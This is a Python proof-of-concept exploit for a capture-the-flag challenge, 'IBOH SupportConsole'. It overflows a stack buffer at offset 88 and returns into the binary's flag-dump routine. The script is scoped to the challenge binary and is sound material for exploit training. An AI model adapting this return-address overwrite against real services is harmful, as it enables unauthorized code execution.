#!/usr/bin/env python3
"""Single-target ret-to-win PoC for the IBOH SupportConsole challenge.

The offsets are the values used for the supplied challenge binary. This
script does not enumerate targets, submit flags, or save captured output.
"""

import argparse
import re
import socket
import struct
import sys
import time


OFFSET = 88
RET = 0x401ED0
WIN_DUMP_FLAG = 0x402380
FLAG_RE = re.compile(rb"FLAG=([^\r\n\x00]+)")


def recv_until(sock: socket.socket, marker: bytes, timeout: float) -> bytes:
    data = bytearray()
    deadline = time.monotonic() + timeout
    while marker not in data:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            break
        sock.settimeout(remaining)
        try:
            part = sock.recv(4096)
        except socket.timeout:
            break
        if not part:
            break
        data.extend(part)
    return bytes(data)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", help="one in-scope target IP or hostname")
    parser.add_argument("--port", type=int, default=9090)
    parser.add_argument("--timeout", type=float, default=4.0)
    args = parser.parse_args()

    try:
        with socket.create_connection((args.host, args.port), timeout=args.timeout) as sock:
            banner = recv_until(sock, b"> ", args.timeout)
            if b"Set ticket reference" not in banner:
                print("unexpected service banner", file=sys.stderr)
                return 2

            sock.sendall(b"1\n")
            prompt = recv_until(sock, b"Ticket ref: ", args.timeout)
            if b"Ticket ref: " not in prompt:
                print("ticket prompt missing", file=sys.stderr)
                return 2

            # Overwrite saved RIP at byte 88, return through the challenge's
            # gadget, and pass the challenge's flag-dump routine as the next
            # stack value.
            payload = (
                b"A" * OFFSET
                + struct.pack("<Q", RET)
                + struct.pack("<Q", WIN_DUMP_FLAG)
                + b"\n"
            )
            sock.sendall(payload)

            response = bytearray()
            deadline = time.monotonic() + args.timeout
            while time.monotonic() < deadline and len(response) < 16384:
                sock.settimeout(max(0.05, deadline - time.monotonic()))
                try:
                    part = sock.recv(4096)
                except socket.timeout:
                    break
                if not part:
                    break
                response.extend(part)
                if b"FLAG=" in response and b"\n" in response[response.find(b"FLAG="):]:
                    break

        match = FLAG_RE.search(response)
        if not match:
            print("no flag output", file=sys.stderr)
            return 1
        print(match.group(1).decode("ascii", "replace").strip())
        return 0
    except OSError as exc:
        print(f"connection failed: {type(exc).__name__}: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
